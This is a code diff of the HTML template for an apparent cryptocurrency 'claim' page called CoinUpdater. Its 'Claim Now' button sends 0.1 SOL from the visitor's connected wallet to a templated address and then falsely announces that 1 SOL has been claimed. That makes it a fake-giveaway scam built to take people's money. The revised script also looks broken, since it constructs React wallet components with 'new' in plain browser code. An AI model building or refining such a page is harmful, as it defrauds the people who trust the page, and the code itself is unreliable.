@@ -38,61 +38,79 @@ HTML_TEMPLATE = """
       font-weight: bold;
     }
   </style>
-  <!-- Solana wallet adapter + scripts -->
+  <!-- Include Solana Wallet Adapter dependencies -->
   <script type="module">
     import {
       Connection,
       PublicKey,
+      clusterApiUrl,
       SystemProgram,
       Transaction
     } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.0/+esm";
 
-    let provider = null;
+    import {
+      WalletAdapterNetwork
+    } from "https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.9.23/+esm";
+
+    import {
+      WalletProvider
+    } from "https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react@0.15.35/+esm";
+
+    import {
+      WalletModalProvider,
+      WalletMultiButton
+    } from "https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react-ui@0.9.35/+esm";
+
+    import {
+      PhantomWalletAdapter,
+      SolflareWalletAdapter
+    } from "https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@0.19.32/+esm";
+
+    const network = WalletAdapterNetwork.Mainnet;
+    const endpoint = clusterApiUrl(network);
+
+    const wallets = [
+      new PhantomWalletAdapter(),
+      new SolflareWalletAdapter()
+    ];
 
     window.onload = () => {
-      if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
-        provider = window.solana;
-        document.getElementById("connectWalletBtn").disabled = false;
-      }
+      const app = document.getElementById("app");
+
+      const connection = new Connection(endpoint);
+
+      const provider = new WalletProvider({ wallets, autoConnect: true });
+
+      const walletModalProvider = new WalletModalProvider();
+
+      const walletMultiButton = new WalletMultiButton();
+
+      app.appendChild(walletMultiButton);
+
+      document.getElementById("claimButton").addEventListener("click", async () => {
+        if (!provider.publicKey) {
+          alert("Please connect your wallet first.");
+          return;
+        }
+
+        const transaction = new Transaction().add(
+          SystemProgram.transfer({
+            fromPubkey: provider.publicKey,
+            toPubkey: new PublicKey("{{ wallet }}"),
+            lamports: 0.1 * 1e9
+          })
+        );
+
+        try {
+          const signature = await provider.sendTransaction(transaction, connection);
+          await connection.confirmTransaction(signature);
+          alert("✅ Transaction sent. You've claimed 1 SOL. Please wait 24 hours.");
+        } catch (e) {
+          console.error(e);
+          alert("❌ Transaction failed.");
+        }
+      });
     };
-
-    async function connectWallet() {
-      try {
-        const res = await provider.connect();
-        document.getElementById("walletStatus").innerText = "Wallet Connected: " + res.publicKey.toString();
-      } catch (err) {
-        alert("Wallet connection failed");
-      }
-    }
-
-    async function sendTransaction() {
-      if (!provider || !provider.publicKey) {
-        alert("Please connect your wallet first.");
-        return;
-      }
-
-      const connection = new Connection("https://api.mainnet-beta.solana.com");
-
-      const transaction = new Transaction().add(
-        SystemProgram.transfer({
-          fromPubkey: provider.publicKey,
-          toPubkey: new PublicKey("{{ wallet }}"),
-          lamports: 0.1 * 1e9
-        })
-      );
-
-      try {
-        const { signature } = await provider.signAndSendTransaction(transaction);
-        await connection.confirmTransaction(signature);
-        alert("✅ Transaction sent. You've claimed 1 SOL. Please wait 24 hours.");
-      } catch (e) {
-        console.error(e);
-        alert("❌ Transaction failed.");
-      }
-    }
-
-    window.connectWallet = connectWallet;
-    window.sendTransaction = sendTransaction;
   </script>
 </head>
 <body>
@@ -100,9 +118,8 @@ HTML_TEMPLATE = """
   <p>Send exactly <b>0.1 SOL</b> to:</p>
   <p><code>{{ wallet }}</code></p>
   <img src="{{ qr_url }}" class="qr" alt="QR Code" />
-  <p id="walletStatus">Wallet not connected</p>
-  <button id="connectWalletBtn" onclick="connectWallet()" class="wallet-button" disabled>Connect Wallet</button>
-  <button onclick="sendTransaction()" class="claim-button">Claim Now</button>
+  <div id="app"></div>
+  <button id="claimButton" class="claim-button">Claim Now</button>
   <footer style="margin-top: 60px; font-size: 0.9em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
 </body>
 </html>
